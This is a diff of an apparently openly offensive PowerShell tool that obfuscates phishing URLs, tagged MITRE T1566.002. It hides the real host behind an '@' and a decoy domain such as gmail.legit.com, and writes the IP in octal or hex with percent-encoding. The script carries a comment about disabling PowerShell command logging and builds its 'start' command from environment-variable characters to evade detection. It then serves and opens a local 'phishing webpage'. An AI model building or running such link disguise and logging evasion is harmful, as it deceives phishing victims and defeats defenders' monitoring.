@@ -3,7 +3,7 @@
    Ip address URL obfuscator [MITRE T1566.002]
 
    Author: r00t-3xp10it
-   Credits: Nick Simonian [@ schema abuse]
+   Credits: Nick Simonian [@ scheme abuse]
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: [Convert]::ToString()
    Optional Dependencies: Invoke-WebRequest
@@ -84,7 +84,7 @@
    None. You cannot pipe objects into url_obfuscator.ps1
 
 .OUTPUTS
-   [19:43] MITRE - T1566.002
+   [19:43] uri @scheme abuse - MITRE T1566.002
 
    scheme    Domain IPadrress    Port
    ------    ------ ---------    ----
@@ -100,7 +100,7 @@
    Octal      0300   0250   0001   0102   8080 
 
 
-   Obfuscated URL             
+   Obfuscated URI             
    --------------             
    http://0300.0250.0001.0102:8080/
   
@@ -126,6 +126,7 @@
 )
 
 
+$Cbites = $null
 $cmdletver = "v1.0.8"
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -143,10 +144,20 @@ If(-not($Convertion -imatch '^(octal|hexadecimal)$'))
    return
 }
 
+## Cmdlet banner
+$URLANATOMY = @"
+┌─────────┬───────────────┬───┬──────────────┬────────┬──────────────────────────────────┐
+| http:// | www.gmail.com | @ | 192.168.1.66 | :8080/ | index.html?q?=public&Shit#Page 1 |
+└─────────┴───────────────┴───┴──────────────┴────────┴──────────────────────────────────┘
+     ↑            ↑         ↑        ↑           ↑                    ↑
+  scheme    missdirection abuse  http.server  http.port    path with\without parameters
+"@;
+write-host $URLANATOMY -ForegroundColor Gray
 
-write-host "`n[" -NoNewline
+write-host "`n`n[" -NoNewline
 write-host "$(Get-Date -Format 'HH:mm')" -ForegroundColor Red -NoNewline
-write-host "] " -NoNewline;write-host "MITRE - T1566.002" -ForegroundColor Red
+write-host "] " -NoNewline;write-host "uri @scheme abuse - MITRE T1566.002" -ForegroundColor Red
+
 
 ## Create Data Table for output
 $mytable = New-Object System.Data.DataTable
@@ -176,7 +187,7 @@ $mytable | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast
 }
 
 
-## Split decimal values
+## Split IP in decimal values
 $one = $IP.Split('.')[0]  # 192
 $doi = $IP.Split('.')[1]  # 168
 $tre = $IP.Split('.')[2]  # 1
@@ -212,24 +223,24 @@ $mytable | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast
 }
 
 Start-Sleep -Milliseconds 600
-## CONVERT to OCTAL - HEXADECIMAL
+## CONVERT to OCTAL <-> HEXADECIMAL
 If(-not($Convertion -imatch '^(octal)$'))
 {
-   $Convertion = 16
+   $Cbites = 16   #-> 16 bites
 }
 Else
 {
-   $Convertion = 8
+   $Cbites = 8    #-> 8 bites
 }
 
-$1 = [Convert]::ToString($one, $Convertion)
-$2 = [Convert]::ToString($doi, $Convertion)
-$3 = [Convert]::ToString($tre, $Convertion)
-$4 = [Convert]::ToString($qua, $Convertion)
+$1 = [Convert]::ToString($one, $Cbites)
+$2 = [Convert]::ToString($doi, $Cbites)
+$3 = [Convert]::ToString($tre, $Cbites)
+$4 = [Convert]::ToString($qua, $Cbites)
 
-If($Convertion -eq 8)
+If($Cbites -eq 8)
 {
-   $Format = "Octal"
+   ## OCTAL 8 bites
    If($1.Length -eq 1)
    {
       $1 = "000"+"$1" -join ''
@@ -284,8 +295,7 @@ If($Convertion -eq 8)
 }
 Else
 {
-   ## HEXADECIMAL
-   $Format = "Hexadecimal"
+   ## HEXADECIMAL 16 bites
    $1 = "0x"+"$1" -join ''
    $2 = "0x"+"$2" -join ''
    $3 = "0x"+"$3" -join ''
@@ -303,7 +313,7 @@ $mytable.Columns.Add("4Range")|Out-Null
 $mytable.Columns.Add("Port")|Out-Null
 
 ## Add values to table
-$mytable.Rows.Add("$Format","$1","$2","$3","$4","$Port")|Out-Null
+$mytable.Rows.Add("$Convertion","$1","$2","$3","$4","$Port")|Out-Null
 
 ## Display Data Table
 $mytable | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1 | ForEach-Object {
@@ -323,7 +333,7 @@ $mytable | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 |
 }
 
 
-## Final url
+## Final uri
 # http:/\/\Gmail%2Ecom@0300%2E0250%2E0001%2E0102:8080/
 Start-Sleep -Milliseconds 600
 If($Port -imatch '^(off)$')
@@ -391,11 +401,11 @@ If($specialchars.IsPresent)
       %253a = : (%25 = % | %3a = :) -> ItFails
 
    .OUTPUTS
-      [18:26] MITRE - T1566.002
+      [18:26] uri @scheme abuse - MITRE T1566.002
 
-      scheme  Domain          IPadrress    Port
-      ------  ------          ---------    ----
-      http:// gmail.legit.com 192.168.1.66 8080
+      scheme  Domain              IPadrress    Port
+      ------  ------              ---------    ----
+      http:// www.gmail.legit.com 192.168.1.66 8080
 
 
       Convertion 1Range 2Range 3Range 4Range Port
@@ -407,25 +417,25 @@ If($specialchars.IsPresent)
       Octal      0300   0250   0001   0102   8080
 
 
-      Obfuscated URL
+      Obfuscated URI
       --------------
-      http:/\/\gmail%2Elegit%2Ecom@0300%2E0250%2E0001%2E0102:8080/
+      http:/\/\%77%77%77%2Egmail%2Elegit%2Ecom@0300%2E0250%2E0001%2E0102:8080/
    #>
 
 
    If($Domain -match '(www\.)')
    {
-      ## Append extra obfucation to Domain name
+      ## Append extra obfucation to -domain entry
       $FinalUrl = $FinalUrl -replace 'www\.','%77%77%77%2E'
    }
 
-   ## Append extra obfucation to URL
+   ## Append extra obfucation to URI
    $FinalUrl = $FinalUrl -replace '/','/\'
    $FinalUrl = $FinalUrl -replace '\.','%2E'
     
    If(-not([string]::IsNullOrEmpty($Path)) -and ($Path -notmatch '^(off)$'))
    {
-      ## Append extra obfucation to PATH
+      ## Append extra obfucation to URI\PATH
       $Path = $Path -replace '/','/\'    ## /
       $Path = $Path -replace '\.','%2E'  ## .
       $Path = $Path -replace '\?','%3F'  ## ?
@@ -459,7 +469,7 @@ If(-not([string]::IsNullOrEmpty($Path)) -and ($Path -notmatch '^(off)$'))
 
 ## Create Data Table for output
 $mytable = New-Object System.Data.DataTable
-$mytable.Columns.Add("Obfuscated URL")|Out-Null
+$mytable.Columns.Add("Obfuscated URI")|Out-Null
 
 ## Add values to table
 $mytable.Rows.Add("$FinalUrl")|Out-Null
@@ -487,10 +497,10 @@ If($Exec.IsPresent)
    <#
    .SYNOPSIS
       Author: r00t-3xp10it
-      Helper - start python http.server
+      Helper - start python http.server [local]
 
    .OUTPUTS
-      [18:26] MITRE - T1566.002
+      [18:26] uri @scheme abuse - MITRE T1566.002
 
       scheme  Domain          IPadrress    Port
       ------  ------          ---------    ----
@@ -506,13 +516,13 @@ If($Exec.IsPresent)
       Octal      0300   0250   0001   0102   8080
 
 
-      Obfuscated URL
+      Obfuscated URI
       --------------
       http:/\/\gmail%2Elegit%2Ecom@0300%2E0250%2E0001%2E0102:8080/
 
       Execute http.server                              
       -------------------                               
-      start http:/\/\gmail%2Elegit%2Ecom@0300%2E0250%2E0001%2E0102:8080/
+      &($Env:DRIVERDATA[9,14,35,21,14]-join'') http:/\/\gmail%2Elegit%2Ecom@0300%2E0250%2E0001%2E0102:8080/
    #>
 
    $CheckMe = (python --version)
@@ -534,20 +544,12 @@ If($Exec.IsPresent)
       return   
    }
 
-   $SysCallList = @(
-      "&('s0xar0x' -replace '0x','t')",
-      "&(`$Env:DRIVERDATA[9,14,35,21,14]-join'')"
-   )
-
-   ## Random select one obfuscated 'start' command
-   $systemcall = $(Get-Random -InputObject $SysCallList)
-
    ## Create Data Table for output
    $mytable = New-Object System.Data.DataTable
    $mytable.Columns.Add("Execute http.server")|Out-Null
+   $ToExecutE = "&(`$Env:DRIVERDATA[9,14,35,21,14]-join'') $FinalUrl"
 
    ## Add values to table
-   $ToExecutE = "$systemcall $FinalUrl"
    $mytable.Rows.Add("$ToExecutE")|Out-Null
 
    ## Display Data Table
@@ -567,11 +569,13 @@ If($Exec.IsPresent)
       Write-Host @stringformat $_
    }
 
+   ## http.server terminal console banner
    If(-not(Test-Path -Path "banner.mp"))
    {
       iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/banner.mp" -OutFile "banner.mp"|Unblock-File
    }
 
+   ## Select last python verion
    If($CheckMe -imatch '^(Python 3\.\d)')
    {
       $interpreter = "python3" 
@@ -581,18 +585,28 @@ If($Exec.IsPresent)
       $interpreter = "python"
    }
 
-   ## Execute URL
+   ## Start http.server [local]
    Start-Process powershell.exe -argumentlist "Get-content banner.mp;write-host '[ Press CTRL+C to exit python http.server ]' -foregroundcolor red;$interpreter -m http.server $Port --bind $IP"
-   Start-Sleep -Milliseconds 2300
+   Start-Sleep -Milliseconds 2300;Remove-Item -Path "$pwd\banner.mp" -Force
 
-   $ToExecutE|&('rEX' -replace 'r','I')
+   ## Execute phishing webpage [local]
+   &($Env:DRIVERDATA[9,14,35,21,14]-join'') $FinalUrl
 }
 
 If($Logfile.IsPresent)
 {
-   write-host "logfile    : " -NoNewline
+   write-host "[" -NoNewline
+   write-host "logfile" -ForegroundColor Red -NoNewline;write-host "] " -NoNewline
    write-host "$pwd\URL_obfuscated.log`n" -ForegroundColor Red
-   echo $FinalUrl|Out-File -FilePath "$pwd\URL_obfuscated.log" -Encoding string -Force
+
+   If($Exec.IsPresent)
+   {
+      echo "$ToExecutE"|Out-File -FilePath "$pwd\URL_obfuscated.log" -Encoding string -Force
+   }
+   Else
+   {
+      echo $FinalUrl|Out-File -FilePath "$pwd\URL_obfuscated.log" -Encoding string -Force   
+   }
 }
 
 exit
